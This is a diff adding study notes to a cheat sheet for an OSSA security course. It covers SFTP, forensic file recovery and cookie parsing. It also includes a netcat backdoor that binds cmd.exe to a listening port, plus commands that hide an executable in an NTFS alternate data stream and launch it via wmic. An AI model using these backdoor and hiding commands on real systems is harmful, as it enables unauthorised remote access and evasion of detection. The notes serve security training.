@@ -1,17 +1,33 @@
 # CHEATSHEET FOR OSSA COURSE 
 
+## Other notes sources
+- https://github.com/PlatyPew/OSSA-Notes/tree/master
+- https://github.com/perxpective/Cybersecurity-Therapy/blob/main/Others/OSSA/OSSA%20Summary.md
+- https://github.com/exetr/OSSA-Notes
+
 ## Things to take note 
-- 
+- run `tar zxvf` to install tar packages
+- run `rpm -i` to install rpm packages
+- most tools in Win7/Centos7
 
 ## Part 1: What is Information Security
-
 ```
 no commands to take note of
 ```
-
 ## Part 2: Defending Your Turf & Securing Policy Formulation
-
+```
+no commands to take note of
+```
 ## Part 3: Network 101
+
+**SSH**
+- use putty (port 22)
+**SFTP**
+```
+sftp user@ipaddress
+```
+- `get <filename>` to download file
+- `bye` to leave
 
 ## Part 4: Defence Tools & Lockdown 
 
@@ -243,14 +259,87 @@ msfconsole.exe
 
 ### Embedding
 **Backdooor Deployment**
+Netcat
 
+- Create remote shell as backdoor
+```
+nc -l -p 48800 -e <windows directory name>\system32\cmd.exe
+```
+- Connect to backdoor
+```
+nc <ip address> 48800
+```
 ### Egress
+**File hiding using Alternate Data Streams**
+- Using the `type` command to stream (hide) a file:
+```
+type c:\6\nc.exe . c:\hobbit.txt:hidenc.exe
+```
+
+- To run the streamed (hidden) executable:
+```
+wmic process call create c:\<full file path>:hidenc.exe
+```
+
+- Streaming (hiding) a text file:
+```
+notepad c:\<full file path>:hidden.txt
+```
+**File hiding using Steganography**
+- Using S-Tools
+    - try guess using different encryption algo
 
 ## Part 6: Wireless Insecurity
 ```
 no commands to take note of
 ```
 ## Part 7: Incident Response & Computer Forensics
+**Discover, Recover & Identify Deleted Files**
+
+- Option 1 > 
+    - Mount .dd image file using OSFMount software in Win7 VM
+    - Open disk-investigator.exe
+        - go `Directories`
+        - go drive @ files 
+            - click `FILE -> UNDELETE`
+        - open new file check header
+            - refer to https://www.garykessler.net/library/file_sigs.html
+            - can also use https://hexed.it/
+
+- Option 2 > 
+    - Open foremost
+    - move .dd file in directory fore foremost
+    - Run foremost to extract deleted files
+    ```
+    foremost -T -i usb.dd
+    ```
+    - file check header
+        - refer to https://www.garykessler.net/library/file_sigs.html
+        - can also use https://hexed.it/
+
+**Browser Forensic Analysis**
+
+Pasco
+- copy all `index.dat` (cookie file) to directory where Pasco is
+- extract info from cookie
+```
+pasco -d <index.dat_filename>
+```
+- extract info from cookie to new file
+```
+pasco -d <index.dat_filename> > <newfilenname>
+```
+
+Galleta
+- copy all `administrator@yahoo[1].txt` (cookie file) to directory where Galleta is
+- extract info from cookie
+```
+galleta <name_of_cookie>
+```
+- extract info from cookie to new file
+```
+galleta <name_of_cookie>> <newfilenname>
+```
 
 ## Part 8: The Impact of Law
 ```
